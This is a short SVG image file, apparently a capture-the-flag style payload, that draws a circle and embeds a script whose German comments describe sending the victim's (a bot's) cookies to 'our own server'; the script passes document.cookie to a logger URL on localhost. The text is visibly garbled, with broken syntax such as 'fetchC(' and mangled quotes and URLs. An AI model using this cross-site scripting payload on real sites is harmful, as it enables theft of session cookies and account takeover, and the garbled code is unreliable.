<?xml version-"1.0"
standalone="no"?>
<svg version="l.l" width="100"
height-"100"
xmlns="http:/(www.w3.org/2000/svg"
>
 <circle cx="50" cy="50" r="40"
fill="crimson" />

 <script>
  // Die URL unseres eingebauten
Loggers
  const loggerUrl =
'http://localhost:3000/api/log';

  // Sende die Cookies des Opfers
(des Bots) an unseren eigenen Server.
fetchC('${loggerUrl}?cookie=
${document.cookie}`);
 </script>
 </svg>